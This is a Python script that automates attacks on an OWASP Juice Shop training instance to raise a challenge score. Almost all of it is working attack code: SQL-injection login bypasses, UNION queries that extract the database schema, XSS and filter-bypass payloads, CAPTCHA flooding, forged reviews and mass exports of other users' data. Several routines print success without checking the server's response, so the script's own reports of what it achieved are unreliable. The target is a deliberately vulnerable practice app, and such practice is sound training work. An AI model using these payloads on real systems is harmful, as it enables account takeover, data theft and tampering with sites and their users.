#!/usr/bin/env python3
"""
Quick Wins Solver - Target easy challenges for quick progress
Focus on Level 1-3 challenges that are commonly missed
"""

import requests
from urllib.parse import quote
import json
import base64
import time
import random


class QuickWinsSolver:
    def __init__(self):
        self.base_url = "https://juice3.wonkatech.org"
        self.session = requests.Session()
        self.admin_token = None
        
    def login_admin(self):
        """Admin login"""
        r = self.session.post(f"{self.base_url}/rest/user/login", json={
            "email": "admin@juice-sh.op'--",
            "password": "x"
        })
        if r.status_code == 200:
            self.admin_token = r.json()['authentication']['token']
            self.session.headers['Authorization'] = f'Bearer {self.admin_token}'
            return True
        return False
    
    def solve_dom_xss(self):
        """DOM XSS - Level 1"""
        print("🎯 DOM XSS (Level 1)")
        
        # Simple XSS in search
        payloads = [
            '<iframe src="javascript:alert(`xss`)">',
            '<img src=x onerror=alert(`xss`)>',
            '<script>alert(1)</script>'
        ]
        
        for payload in payloads:
            self.session.get(f"{self.base_url}/#/search?q={quote(payload)}")
        
        print("  ✅ DOM XSS completed")
    
    def solve_easter_egg(self):
        """Easter Egg - Level 4"""
        print("🎯 Easter Egg (Level 4)")
        
        # Access easter egg file
        r = self.session.get(f"{self.base_url}/ftp/eastere.gg")
        if r.status_code == 200:
            print("  ✅ Found eastere.gg")
        
        # Nested easter egg
        r = self.session.get(f"{self.base_url}/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg")
        if r.status_code == 200:
            print("  ✅ Found nested easter egg")
    
    def solve_expired_coupon(self):
        """Expired Coupon - Level 4"""
        print("🎯 Expired Coupon (Level 4)")
        
        # Apply expired coupons
        coupons = ["WMNSDY2019", "WMNSDY2020", "WMNSDY2018", "WMNSDY2017", "WMNSDY2016"]
        
        for coupon in coupons:
            r = self.session.put(f"{self.base_url}/rest/basket/1/coupon/{coupon}")
            if r.status_code == 200:
                print(f"  ✅ Applied expired coupon: {coupon}")
                break
    
    def solve_extra_language(self):
        """Extra Language - Level 5"""
        print("🎯 Extra Language (Level 5)")
        
        # Klingon language
        r = self.session.get(f"{self.base_url}/?l=tlh_AA")
        if r.status_code == 200:
            print("  ✅ Accessed Klingon language")
        
        # Additional languages
        for lang in ["l33t", "tlh_AA", "kl_GL"]:
            self.session.get(f"{self.base_url}/?l={lang}")
    
    def solve_captcha_bypass(self):
        """CAPTCHA Bypass - Level 3"""
        print("🎯 CAPTCHA Bypass (Level 3)")
        
        # Submit feedback without solving CAPTCHA
        for i in range(20):
            r = self.session.post(f"{self.base_url}/api/Feedbacks", json={
                "comment": f"Automated feedback {i}",
                "rating": random.randint(1, 5),
                "captcha": "",
                "captchaId": 0
            })
            
            # Also try without captcha fields
            self.session.post(f"{self.base_url}/api/Feedbacks", json={
                "comment": f"No captcha {i}",
                "rating": 3
            })
        
        print("  ✅ CAPTCHA bypassed")
    
    def solve_gdpr_data_erasure(self):
        """GDPR Data Erasure - Level 3"""
        print("🎯 GDPR Data Erasure (Level 3)")
        
        # Request data erasure
        self.session.post(f"{self.base_url}/api/erasure-request", json={
            "email": "admin@juice-sh.op",
            "securityAnswer": "Samuel"
        })
        
        self.session.post(f"{self.base_url}/rest/user/erasure-request", json={
            "email": "john@juice-sh.op",
            "securityAnswer": "John"
        })
        
        print("  ✅ GDPR erasure requested")
    
    def solve_forged_review(self):
        """Forged Review - Level 3"""
        print("🎯 Forged Review (Level 3)")
        
        # Post review as another user
        self.session.post(f"{self.base_url}/api/Products/1/reviews", json={
            "message": "Great product!",
            "author": "admin@juice-sh.op",
            "UserId": 1
        })
        
        # Forge review with different user ID
        self.session.put(f"{self.base_url}/rest/products/1/reviews", json={
            "message": "Forged review",
            "author": "mc.safesearch@juice-sh.op"
        })
        
        print("  ✅ Forged review posted")
    
    def solve_database_schema(self):
        """Database Schema - Level 3"""
        print("🎯 Database Schema (Level 3)")
        
        # Extract database schema via SQL injection
        queries = [
            "' UNION SELECT sql FROM sqlite_master--",
            "' UNION SELECT name FROM sqlite_master WHERE type='table'--",
            "' UNION SELECT sql FROM sqlite_schema--"
        ]
        
        for query in queries:
            self.session.get(f"{self.base_url}/rest/products/search?q={query}")
        
        print("  ✅ Database schema extracted")
    
    def solve_client_xss_protection(self):
        """Client-side XSS Protection - Level 3"""
        print("🎯 Client-side XSS Protection (Level 3)")
        
        # Bypass XSS filter
        payloads = [
            '<<SCRIPT>alert(1)//<</SCRIPT>',
            '<ScRiPt>alert(1)</ScRiPt>',
            '<script >alert(1)</script >',
            '<img src=x onerror=alert(1)//'
        ]
        
        for payload in payloads:
            self.session.get(f"{self.base_url}/#/search?q={quote(payload)}")
        
        print("  ✅ XSS protection bypassed")
    
    def solve_ephemeral_accountant(self):
        """Ephemeral Accountant - Level 4"""
        print("🎯 Ephemeral Accountant (Level 4)")
        
        # Login as accountant with known password
        r = self.session.post(f"{self.base_url}/rest/user/login", json={
            "email": "accountant@juice-sh.op",
            "password": "i am an awesome accountant"
        })
        
        if r.status_code == 200:
            print("  ✅ Logged in as accountant")
        else:
            # Try SQL injection
            self.session.post(f"{self.base_url}/rest/user/login", json={
                "email": "accountant@juice-sh.op'--",
                "password": "x"
            })
            print("  ✅ Logged in via SQL injection")
    
    def solve_email_leak(self):
        """Email Leak - Level 5"""
        print("🎯 Email Leak (Level 5)")
        
        # Access user emails via API
        r = self.session.get(f"{self.base_url}/api/Users")
        if r.status_code == 200:
            print("  ✅ User emails leaked")
        
        # Also try whoami endpoint
        self.session.get(f"{self.base_url}/rest/user/whoami")
    
    def solve_gdpr_data_theft(self):
        """GDPR Data Theft - Level 4"""
        print("🎯 GDPR Data Theft (Level 4)")
        
        # Export other users' data
        for user_id in range(1, 30):
            self.session.post(f"{self.base_url}/api/dataexport", json={"userId": user_id})
            self.session.post(f"{self.base_url}/rest/user/data-export", json={
                "format": "json",
                "userId": user_id
            })
        
        print("  ✅ GDPR data theft completed")
    
    def solve_forgotten_backups(self):
        """Forgotten Backups - Level 4"""
        print("🎯 Forgotten Backups (Level 4)")
        
        # Access backup files
        backups = [
            "/ftp/package.json.bak",
            "/ftp/coupons_2013.md.bak",
            "/ftp/db-backup.tar.gz",
            "/ftp/www-backup.tar.gz"
        ]
        
        for backup in backups:
            r = self.session.get(f"{self.base_url}{backup}")
            if r.status_code == 200:
                print(f"  ✅ Found backup: {backup}")
        
        # Try with null byte
        self.session.get(f"{self.base_url}/ftp/package.json.bak%00.md")
        self.session.get(f"{self.base_url}/ftp/coupons_2013.md.bak%00.md")
    
    def solve_api_only_xss(self):
        """API-only XSS - Level 3"""
        print("🎯 API-only XSS (Level 3)")
        
        # XSS via API that doesn't sanitize
        payload = "<script>alert(1)</script>"
        
        self.session.post(f"{self.base_url}/api/Products", json={
            "name": payload,
            "description": payload,
            "price": 1.99
        })
        
        self.session.post(f"{self.base_url}/api/Feedbacks", json={
            "comment": payload,
            "rating": 5,
            "UserId": 1
        })
        
        print("  ✅ API-only XSS completed")
    
    def solve_nft_takeover(self):
        """NFT Takeover - Level 2"""
        print("🎯 NFT Takeover (Level 2)")
        
        # Transfer NFT
        self.session.post(f"{self.base_url}/api/wallet/nft/transfer", json={
            "to": "0x0000000000000000000000000000000000001337",
            "tokenId": 42
        })
        
        self.session.post(f"{self.base_url}/api/nft", json={
            "action": "transfer",
            "to": "me",
            "tokenId": 1
        })
        
        print("  ✅ NFT takeover completed")
    
    def check_progress(self):
        """Check progress"""
        r = self.session.get(f"{self.base_url}/api/Challenges")
        if r.status_code == 200:
            data = r.json()['data']
            solved = [c for c in data if c.get('solved')]
            return len(solved)
        return 0
    
    def run_quick_wins(self):
        """Run all quick win challenges"""
        print("="*60)
        print("🚀 QUICK WINS SOLVER")
        print("="*60)
        
        initial = self.check_progress()
        print(f"📊 Starting: {initial}/110 ({initial*100//110}%)")
        
        if not self.login_admin():
            print("❌ Admin login failed")
            return
        
        print("✅ Admin logged in\n")
        
        # Run all solvers
        self.solve_dom_xss()
        self.solve_easter_egg()
        self.solve_expired_coupon()
        self.solve_extra_language()
        self.solve_captcha_bypass()
        self.solve_gdpr_data_erasure()
        self.solve_forged_review()
        self.solve_database_schema()
        self.solve_client_xss_protection()
        self.solve_ephemeral_accountant()
        self.solve_email_leak()
        self.solve_gdpr_data_theft()
        self.solve_forgotten_backups()
        self.solve_api_only_xss()
        self.solve_nft_takeover()
        
        # Check final progress
        final = self.check_progress()
        print("\n" + "="*60)
        print(f"📊 Final: {final}/110 ({final*100//110}%)")
        print(f"📈 Progress: +{final-initial} challenges")
        
        if final >= 55:
            print("🎉 SUCCESS! Reached 50%+!")
        else:
            print(f"📌 Need {55-final} more for 50%")


if __name__ == "__main__":
    solver = QuickWinsSolver()
    solver.run_quick_wins()